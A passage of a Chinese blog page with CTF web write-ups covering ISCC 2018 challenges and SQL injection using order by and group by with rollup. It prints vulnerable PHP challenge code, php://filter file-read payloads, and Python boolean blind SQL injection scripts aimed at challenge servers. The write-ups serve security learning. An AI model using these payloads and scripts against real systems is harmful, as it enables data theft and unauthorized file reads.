class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>让我们输入username和password，要求只有一个，就是让我们密码的md5为0，构造0e开头的MD5就够了。<br>接着跳到了一个页面叫我们点击，那就按照他的意思点击吧。<br>接下来发现又是一段源码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NULL &lt;?php </span><br><span class="line">include &apos;flag.php&apos;; </span><br><span class="line">$a = @$_REQUEST[&apos;a&apos;]; </span><br><span class="line">@eval(&quot;var_dump($$a);&quot;); </span><br><span class="line">show_source(__FILE__); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>直接构造a=GLOBALS就行了，这是某春秋上的原题了。</p>
<h3 id="sql注入的艺术"><a href="#sql注入的艺术" class="headerlink" title="sql注入的艺术"></a>sql注入的艺术</h3><p>首先测试了一下’和”是否有用，发现被过滤了，接着试了试<strong>%df%27</strong>发现原来这是宽字节注入，其他的啥也没过滤，按着流程走就行了  </p>
<h3 id="试试看"><a href="#试试看" class="headerlink" title="试试看"></a>试试看</h3><p>观察url发现这又是一道文件包含的题目，瞎操作了一个晚上还是读取不出东西，之后只好求助郁离歌大手子，他丢了两个源码给我让我做代码审计，我自己搭环境测试了好久最终才做出来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&apos;display_errors&apos;,&apos;Off&apos;);</span><br><span class="line"></span><br><span class="line">include(&apos;config.php&apos;);</span><br><span class="line"></span><br><span class="line">$img = $_GET[&apos;img&apos;];</span><br><span class="line">if(isset($img) &amp;&amp; !empty($img))</span><br><span class="line">&#123;</span><br><span class="line">    if(strpos($img,&apos;jpg&apos;) !== false)</span><br><span class="line">    &#123;</span><br><span class="line">        if(strpos($img,&apos;resource=&apos;) !== false &amp;&amp; preg_match(&apos;/resource=.*jpg/i&apos;,$img) === 0)</span><br><span class="line">        &#123;</span><br><span class="line">            die(&apos;File not found.&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        preg_match(&apos;/^php:\/\/filter.*resource=([^|]*)/i&apos;,trim($img),$matches);</span><br><span class="line">        if(isset($matches[1]))</span><br><span class="line">        &#123;</span><br><span class="line">            $img = $matches[1];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        header(&apos;Content-Type: image/jpeg&apos;);</span><br><span class="line">        $data = get_contents($img);</span><br><span class="line">        echo $data;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        die(&apos;File not found.&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;img src=&quot;1.jpg&quot;&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>以及<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">function get_contents($img)</span><br><span class="line">&#123;</span><br><span class="line">	if(strpos($img,&apos;jpg&apos;) !== false)</span><br><span class="line">	&#123;</span><br><span class="line">		return file_get_contents($img);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		header(&apos;Content-Type: text/html&apos;);</span><br><span class="line">		return file_get_contents($img);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>config.php就是读取文件，关键是如何绕过show.php把我们所需要的文件传进去，它要求我们的参数里面必须包含img但是我们一旦有img那读取的一定是图片格式，所以，我们需要把img给弄掉，把我们的show.php的字符传进去。</p>
<blockquote>
<p>preg_match(‘/^php:\/\/filter.<em>resource=([^|]</em>)/i’,trim($img),$matches)   </p>
</blockquote>
<p> 这是把我们resource之后的字符传进去的代码，由于对正则不太熟悉，所以我在本地试了试这行代码的作用，在这个正则表达式中，读取的字符串只是最后一个resource=之后的(感兴趣自己去学习一个正则)，所以我们可以构造多个resource来读取我们所要的字符串，payload为<strong>?img=php://filter/resource=10.jpg/resource=show.php</strong>我们就能读取我们所要的文件了，flag在哪完全是靠直觉，读取flag的操作为<strong>?img=php://filter/resource=10.jpg/resource=../flag.php</strong></p>
<h3 id="Sqli"><a href="#Sqli" class="headerlink" title="Sqli"></a>Sqli</h3><p>讲真，很讨厌这种注入题，也没什么提示，首先还是按照一些万能密码试试，在试到<strong>admin’#</strong>发现成功登入了，这就说明<strong>‘</strong>和<strong>#</strong>没有被过滤，然后试了试<strong>admin’ and 1=1#</strong>和<strong>admin’ and 1=2#</strong>，发现回显不同，布尔型注入没跑了，首先是爆出password，然后登入有个提示flag在kjafuibafuohnuvwnruniguankacbh里面，所以爆破这个字段发现flag，这是最后爆破的脚本。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">databaselength = 13</span><br><span class="line">databasename = &quot;sqli_database&quot;</span><br><span class="line">url = &quot;http://118.190.152.202:8011/&quot;</span><br><span class="line">tablenumber = 2</span><br><span class="line">tablelength = 4</span><br><span class="line">tablename1 = &quot;news&quot;</span><br><span class="line">columnnumber = 6</span><br><span class="line">columnnames = &quot;title note kjafuibafuohnuvwnruniguankacbh id date text&quot;</span><br><span class="line">tablename2 = &quot;user&quot;</span><br><span class="line">columnnumber2 = 45</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    r = requests.post(url,data=&#123;&quot;username&quot;:&quot;admin&apos; and ((select length(kjafuibafuohnuvwnruniguankacbh) from news)=%d)#&quot;%(i),&quot;password&quot;:&quot;123&quot;&#125;)</span><br><span class="line">    if &quot;normal user&quot; in r.content:</span><br><span class="line">        length = i</span><br><span class="line">        break</span><br><span class="line">for i in range(1,length+1):</span><br><span class="line">    for j in range(20,123):</span><br><span class="line">        r1 = requests.post(url,data=&#123;&quot;username&quot;:&quot;admin&apos; and ((select ascii(substr(kjafuibafuohnuvwnruniguankacbh,%d,1)) from news)=%d)#&quot;%(i,j),&quot;password&quot;:&quot;123&quot;&#125;)</span><br><span class="line">        if &quot;normal user&quot; in r1.content:</span><br><span class="line">            flag = flag + chr(j)</span><br><span class="line">            break</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure></p>
<h3 id="Collide"><a href="#Collide" class="headerlink" title="Collide"></a>Collide</h3><p>直接给了源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;secret.php&quot;;</span><br><span class="line">@$username=(string)$_POST[&apos;username&apos;];</span><br><span class="line">function enc($text)&#123;</span><br><span class="line">    global $key;</span><br><span class="line">    return md5($key.$text);</span><br><span class="line">&#125;</span><br><span class="line">if(enc($username) === $_COOKIE[&apos;verify&apos;])&#123;</span><br><span class="line">    if(is_numeric(strpos($username, &quot;admin&quot;)))&#123;</span><br><span class="line">        die($flag);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;you are not admin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    setcookie(&quot;verify&quot;, enc(&quot;guest&quot;), time()+60*60*24*7);</span><br><span class="line">    setcookie(&quot;len&quot;, strlen($key), time()+60*60*24*7);</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure></p>
<p>如果我们的md5(key.username)不等于我们传过去的verify那么网页会自己生成一个verify=md5(key.guest)，以及length为key的长度。那这样我们知道了以下几点：<br>key的长度，key+guest的md5以及username要有admin。<br>已知的条件是不是很熟悉呢？再梳理一遍。<br>salt为51位，salt的MD5已知，拓展字符位admin。<br>没错这就是Hash长度拓展攻击。那么先把username=name这个post过去，然后抓包，使用脚本来拓展，然后传参。<br><img src="../images/10/5.png" alt=""><br><img src="../images/10/6.png" alt=""></p>
<h3 id="Only-admin-can-see-flag"><a href="#Only-admin-can-see-flag" class="headerlink" title="Only admin can see flag"></a>Only admin can see flag</h3><p>见之前的一篇文章。  </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/05/25/ISCC之Web的一些wp/" data-id="cjmni3xtu000pywvelxjqc8r5" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-order by和group by在sql注入中的妙用" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/05/23/order by和group by在sql注入中的妙用/" class="article-date">
  <time class="post-time" datetime="2018-05-23T03:12:12.000Z" itemprop="datePublished">
    <span class="post-month">5月</span><br/>
    <span class="post-day">23</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/05/23/order by和group by在sql注入中的妙用/">order by以及group by在sql注入中的妙用</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近Iscc的注入题目真是让人发疯，为此我找了一些sql注入来练手，发现了这么几道有趣的题目，来记录一下  </p>
<h2 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h2><p>总所周知，在sql注入中，我们一般使用<strong>order by</strong>来确定列数，这样有助于我们使用联合查询来查询我们所要的数据，为何可以查询出我们所要的数据呢？因为order by是一个排序的函数，order by x的意思是对x列的数据进行ascii码的排序，如果这一列不存在，那么就会报错，所以可以达到确定列数的作用。例子就借鉴大手子的吧。<br><img src="https://upload-images.jianshu.io/upload_images/3372127-999e68d5df275dfb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br><img src="https://upload-images.jianshu.io/upload_images/3372127-e0876d231d209f40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""> </p>
<h3 id="例子如下"><a href="#例子如下" class="headerlink" title="例子如下"></a>例子如下</h3><p>扫出有源码，如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $dbhost = &quot;localhost&quot;;</span><br><span class="line">  $dbuser = &quot;root&quot;;</span><br><span class="line">  $dbpass = &quot;123456&quot;;</span><br><span class="line">  $db = &quot;ctf&quot;;</span><br><span class="line">  $conn = mysqli_connect($dbhost,$dbuser,$dbpass,$db);</span><br><span class="line">  mysqli_set_charset($conn,&quot;utf8&quot;);</span><br><span class="line"> </span><br><span class="line">  /* sql</span><br><span class="line"> </span><br><span class="line">     create  table `admin` (</span><br><span class="line">        `id` int(10) not null primary key auto_increment,</span><br><span class="line">        `username` varchar(20) not null ,</span><br><span class="line">        `password` varchar(32) not null</span><br><span class="line">     );</span><br><span class="line">  */</span><br><span class="line">function   filter($str)&#123;</span><br><span class="line">      $filterlist = &quot;/\(|\)|username|password|where|</span><br><span class="line">      case|when|like|regexp|into|limit|=|for|;/&quot;;</span><br><span class="line">      if(preg_match($filterlist,strtolower($str)))&#123;</span><br><span class="line">        die(&quot;illegal input!&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      return $str;</span><br><span class="line">  &#125;</span><br><span class="line">$username = isset($_POST[&apos;username&apos;])?</span><br><span class="line">filter($_POST[&apos;username&apos;]):die(&quot;please input username!&quot;);</span><br><span class="line">$password = isset($_POST[&apos;password&apos;])?</span><br><span class="line">filter($_POST[&apos;password&apos;]):die(&quot;please input password!&quot;);</span><br><span class="line">$sql = &quot;select * from admin where  username =</span><br><span class="line"> &apos;$username&apos; and password = &apos;$password&apos; &quot;;</span><br><span class="line"> </span><br><span class="line">$res = $conn -&gt; query($sql);</span><br><span class="line">if($res-&gt;num_rows&gt;0)&#123;</span><br><span class="line">  $row = $res -&gt; fetch_assoc();</span><br><span class="line">  if($row[&apos;id&apos;])&#123;</span><br><span class="line">     echo $row[&apos;username&apos;];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   echo &quot;The content in the password column is the flag!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>从源码可以得出，在这个<strong>admin</strong>表中有三列。其次呢，发现这题目过滤了<strong>password，username，=</strong>等等，然后就是回显的要求了，要求我们输入的数据在数据库里面存在，然后通过id给我们返回username，但是我们所要的flag在password里面，这里就需要我们用一些特殊的方法来把password提取出来，由于回显，我们考虑一下布尔型注入，发现<strong>（）</strong>被ban了，所以这一条路是走不通了，不过仔细观察发现，我们除了<strong>union select</strong>还可以利用’以及order by等函数。结合回显是通过id来查询，所以我们可以使用order by进行排序然后通过不同输出判断密码值。我们可以试试。<br>首先通过构造<strong>‘ or 1#</strong>查查原来的username。<br><img src="../images/13/1.png" alt=""><br>再查询一下回显位。<br><img src="../images/13/2.png" alt=""><br>接着按照我们的思路来试试。<br><img src="../images/13/3.png" alt=""><br><img src="../images/13/4.png" alt=""><br>测试完了接下来就可以使用爆破来出flag了。脚本如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url = &quot;http://202.98.28.108:10801/47g256f48gff/&quot;</span><br><span class="line">l = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span><br><span class="line">number = len(l)</span><br><span class="line">password = list()</span><br><span class="line">flag = 0</span><br><span class="line">ps = &quot;&quot;</span><br><span class="line">for i in range(0,32):#32位</span><br><span class="line">    for j in range(0,number):</span><br><span class="line">        p = &quot;&quot;</span><br><span class="line">        password.append(l[j])</span><br><span class="line">        p = p.join(password)</span><br><span class="line">        r = requests.post(url,data=&#123;&quot;username&quot;:&quot;whaleadmin&apos; union select 1,2,&apos;%s&apos; order by 3#&quot;%(p),&quot;password&quot;:&quot;1&quot;&#125;)</span><br><span class="line">        if &quot;whaleadmin&quot; in r.content:</span><br><span class="line">            if j == 0:</span><br><span class="line">                flag = 1</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                password.pop(len(password) - 1)</span><br><span class="line">                password.append(l[j - 1])</span><br><span class="line">                break</span><br><span class="line">        else:</span><br><span class="line">            password.pop(len(password) - 1)</span><br><span class="line">    if flag == 1:</span><br><span class="line">        break</span><br><span class="line">    print password</span><br><span class="line">print ps.join(password)#输出的密码最后一位需要后移一位</span><br></pre></td></tr></table></figure></p>
<p>爆破出密码之后md5解密一下flag就出来了。</p>
<h2 id="group-by以及with-rollup"><a href="#group-by以及with-rollup" class="headerlink" title="group by以及with rollup"></a>group by以及with rollup</h2><p>group by顾名思义就是把不同数据总和起来，然后进行排序输出。具体的例子可以去这里看看<strong><a href="https://www.cnblogs.com/jingfengling/p/5962182.html" target="_blank" rel="noopener">https://www.cnblogs.com/jingfengling/p/5962182.html</a></strong>，我这里就不多阐述了。<br>字句<strong>with rollup</strong>，求平均值的字句用法也不多说，参考<strong><a href="https://blog.csdn.net/id19870510/article/details/6254358" target="_blank" rel="noopener">https://blog.csdn.net/id19870510/article/details/6254358</a></strong></p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>题目地址:<a href="http://ctf5.shiyanbar.com/web/pcat/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/pcat/index.php</a> ，这是实验吧的一道题目。<br>首先f12有个提示，访问/source.txt得到源码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&apos;uname&apos;]) || !isset($_POST[&apos;pwd&apos;])) &#123;</span><br><span class="line">	echo &apos;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	echo &apos;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	echo &apos;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	echo &apos;&lt;input type=&quot;submit&quot; /&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	echo &apos;&lt;/form&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	echo &apos;&lt;!--source: source.txt--&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function AttackFilter($StrKey,$StrValue,$ArrReq)&#123;  </span><br><span class="line">    if (is_array($StrValue))&#123;</span><br><span class="line">        $StrValue=implode($StrValue);</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1)&#123;   </span><br><span class="line">        print &quot;水可载舟，亦可赛艇！&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;</span><br><span class="line">foreach($_POST as $key=&gt;$value)&#123; </span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);</span><br><span class="line">if (!$con)&#123;</span><br><span class="line">	die(&apos;Could not connect: &apos; . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">$db=&quot;XXXXXX&quot;;</span><br><span class="line">mysql_select_db($db, $con);</span><br><span class="line">$sql=&quot;SELECT * FROM interest WHERE uname = &apos;&#123;$_POST[&apos;uname&apos;]&#125;&apos;&quot;;</span><br><span class="line">$query = mysql_query($sql); </span><br><span class="line">if (mysql_num_rows($query) == 1) &#123; </span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line">    if($key[&apos;pwd&apos;] == $_POST[&apos;pwd&apos;]) &#123;</span><br><span class="line">        print &quot;CTF&#123;XXXXXX&#125;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        print &quot;亦可赛艇！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	print &quot;一颗赛艇！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($con);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>源码审计，发现题目过滤了很多东西，起码联合查询，延时注入，盲注都不太现实，但是这里依旧没有过滤select，接着看得到flag的要求。<br>首先我们输入一个用户名，网页通过查询数据库得到该用户名的密码，再把该用户名的密码与我们所输入的进行匹配，如果成功，那么flag就到手了。<br>那么问题来了，我们根本不知道用户名，也不知道其密码是什么，如何达到匹配的效果呢？这里group by就派上了用场。注意这个<strong>$key</strong>是查询结果的赋值，我们在一定前提下是可以控制返回的数据的，根据gourp by的用法，我们可以构造一个语句使得查询的密码经过处理后为空，然后输入的密码也为空以此匹配。<br>构造<strong>‘ or 1 group by pwd with rollup limit 1 offset 0,1,2…….#</strong>偏移值一个一个试过去，毕竟不知道那个是有效值，经过尝试最终试出flag的偏移值为2。</p>
<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>sql注入中的基操还是太多了，学不完学不完…….不过还是该学的得学，紧跟着大佬的步伐。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/05/23/order by和group by在sql注入中的妙用/" data-id="cjmni3xu3000uywvenpt357b2" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>

    </footer>
  </div>
  
</article>




  


  <nav id="page-nav">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">next &raquo;</a>
  </nav>
</section>
        
          <aside id="sidebar">
  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <h1 class="blog-title">Iuhrey的幻想乡</h1>
    <h2 class="blog-subtitle">记录日常所学</h2>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>幻想乡的起点</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>幻想乡图</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>分岔路</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>路标</li>
          </a>
        
    </ul>
  </div>
</div>

  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="/images/avatar.jpg">
    <h2 class="author">Iuhrey</h2>
    <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
    <div class="count-box">
      <a href="/archives"><div><strong>23</strong><br>文章</div></a>
      <a href="/categories"><div><strong>2</strong><br>分类</div></a>
      <a href="/tags"><div><strong>11</strong><br>标签</div></a>
    </div>



    <div class="social-link">
      
        <a class="hvr-bounce-in" href="http://github.com/NoneGirlIuh" target="_blank" title="Github">
          Github
        </a>
      
    </div>

    <div class="friend-link">
      <h2>友情链接</h2>
      
        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
          ShanaMaid
        </a>
      
        <a class="hvr-bounce-in" href="http://mozhucy.cn/" target="_blank" title="喜欢啥几把BB的狗骑驴">
          喜欢啥几把BB的狗骑驴
        </a>
      
        <a class="hvr-bounce-in" href="http://alittlexyz.cn/" target="_blank" title="喜欢gay在狗骑驴旁边的狗逼">
          喜欢gay在狗骑驴旁边的狗逼
        </a>
      
        <a class="hvr-bounce-in" href="http://zaiyewujiang.cn/" target="_blank" title="gay里gay气的大黄">
          gay里gay气的大黄
        </a>
      
        <a class="hvr-bounce-in" href="http://yulige.top/" target="_blank" title="郁离歌大手子的博客">
          郁离歌大手子的博客
        </a>
      
        <a class="hvr-bounce-in" href="http://shaobaobaoer.cn/" target="_blank" title="有很多小姐姐的烧包包">
          有很多小姐姐的烧包包
        </a>
      
    </div>
  </div>
</div>

  
</aside>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=478384&auto=1&height=66"></iframe>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy;2017 - 2018 Iuhrey<br>
      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
      
        |<script src="http://s11.cnzz.com/z_stat.php?id=1273056144&web_id=1273056144" language="JavaScript"></script>
      
    </div>
<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <span id="busuanzi_container_site_uv">本站总访问量<span id="busuanzi_value_site_uv"></span>次</span>
  </div>
</footer>
    </div>
    

<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
<script>
new WOW().init();
</script>   


  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>



  <section class="hidden-xs"> 
  <ul class="cb-slideshow"> 
    <li><span>苟利</span></li> 
    <li><span>国家</span></li> 
    <li><span>生死以</span></li> 
    <li><span>岂能</span></li> 
    <li><span>祸福</span></li> 
    <li><span>趋避之</span></li> 
  </ul>
</section>
<script src="/js/script.js"></script>



  </div>
</body>
</html>